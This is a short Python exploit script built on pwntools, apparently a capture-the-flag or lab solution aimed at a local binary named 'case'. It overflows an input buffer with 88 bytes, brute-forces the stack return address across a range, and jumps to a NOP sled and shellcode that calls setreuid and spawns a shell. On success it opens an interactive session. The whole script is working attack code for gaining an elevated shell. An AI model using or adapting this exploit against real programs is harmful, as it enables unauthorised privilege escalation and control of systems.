from pwn import *

context.arch = "amd64"
context.log_level = "error"

shellcode = asm(shellcraft.setreuid() + shellcraft.sh())

base = 0x7fffffffe248

for offset in range(-0x2000, 0x2001, 16):
    address = base + offset

    payload = b"A" * 88
    payload += p64(address)
    payload += b"\x90" * 32
    payload += shellcode

    if b"\n" in payload:
        continue

    p = process("./case")

    try:
        p.sendlineafter(b"Enter credentials: ", payload)
        p.sendline(b"id")

        output = p.recvrepeat(0.1)

        if b"uid=" in output:
            print("Shell found!", hex(address))
            print(output.decode(errors="replace"))
            p.interactive()
            break

    except EOFError:
        pass

    p.close()
else:
    print("No working address found in the tested range.")
